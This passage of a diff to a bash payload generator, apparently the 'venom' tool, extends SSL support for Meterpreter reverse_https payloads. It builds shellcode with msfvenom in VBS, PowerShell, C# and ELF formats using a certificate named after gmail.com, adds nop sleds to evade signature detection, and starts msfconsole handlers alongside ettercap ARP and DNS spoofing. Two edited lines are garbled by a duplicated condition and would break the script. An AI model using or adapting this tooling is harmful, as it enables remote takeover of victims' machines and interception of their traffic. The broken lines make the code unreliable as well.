             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -4165,7 +4161,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -4186,7 +4182,7 @@ fi
             cd $IPATH/
           else
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -4206,7 +4202,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -4227,7 +4223,7 @@ fi
             cd $IPATH/
           else
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -4288,9 +4284,8 @@ if [ -z "$N4m" ]; then N4m="Prakash";fi
 
 echo "[☠] Building shellcode -> vbs format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 # display final settings to user
@@ -4306,10 +4301,10 @@ cat << !
 !
 
 # use metasploit to build shellcode
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f vbs > $IPATH/obfuscate/$N4m.vbs"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f vbs > $IPATH/obfuscate/$N4m.vbs"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f vbs > $IPATH/obfuscate/$N4m.vbs" > /dev/null 2>&1
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f vbs > $IPATH/obfuscate/$N4m.vbs" > /dev/null 2>&1
 fi
 
 
@@ -4336,7 +4331,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -4357,7 +4352,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
          cd $IPATH/
        else
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -4447,7 +4442,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -4468,7 +4463,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -4488,7 +4483,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -4509,7 +4504,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -4566,9 +4561,8 @@ if [ -z "$N4m" ]; then N4m="notepad";fi
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 
@@ -4585,10 +4579,10 @@ cat << !
 !
 
 # use metasploit to build shellcode
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
 fi
 
 
@@ -4663,7 +4657,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -4684,7 +4678,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           cd $IPATH/
         else
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -4817,7 +4811,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -4838,7 +4832,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -4857,7 +4851,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -4878,7 +4872,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -7761,10 +7755,6 @@ fi
 
 
 
-
-
-
-
 # -----------------------------
 # Android PDF payload 
 # ----------------------------- 
@@ -7935,10 +7925,6 @@ fi
 
 
 
-
-
-
-
 #
 # ELF agent (linux systems)
 #
@@ -7960,8 +7946,7 @@ if [ -z "$N4m" ]; then N4m="ElfPayload";fi
 echo "[☠] Building shellcode -> ELF format .."
 sleep 2
 if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 # display final settings to user
@@ -7981,9 +7966,9 @@ echo "[☠] Using msfvenom to build agent .."
 sleep 2
 # if payload sellected its == then trigger SSL support
 if [ "$paylo" = "linux/x86/meterpreter_reverse_https" ] || [ "$paylo" = "linux/x64/meterpreter_reverse_https" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f elf > $IPATH/output/$N4m.elf"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f elf > $IPATH/output/$N4m.elf"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f elf > $IPATH/output/$N4m.elf"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f elf > $IPATH/output/$N4m.elf"
 fi
 
 sleep 2
@@ -10843,9 +10828,8 @@ sleep 1
 # display final settings to user
 echo "[☠] Building shellcode -> CSHARP format .."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 cat << !
 
@@ -10861,10 +10845,10 @@ cat << !
 !
 
 # use metasploit to build shellcode (msf encoded)
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f csharp -o $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f csharp -o $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f csharp -o $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f csharp -o $IPATH/output/chars.raw"
 fi
 
 
@@ -10925,7 +10909,7 @@ zenity --info --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IP
       echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -10946,7 +10930,7 @@ zenity --info --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IP
            cd $IPATH/
          else
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -11024,7 +11008,7 @@ if [ "$chose" = "Build venom agent.bat" ]; then
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
 
-  if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+  if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
     echo "[☠] meterpreter over SSL sellected .."
     sleep 1
   fi
@@ -11047,10 +11031,10 @@ cat << !
 # HINT: use -n to add extra bits (random) of nopsled data to evade signature detection
 #
 KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
 fi
 disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
 
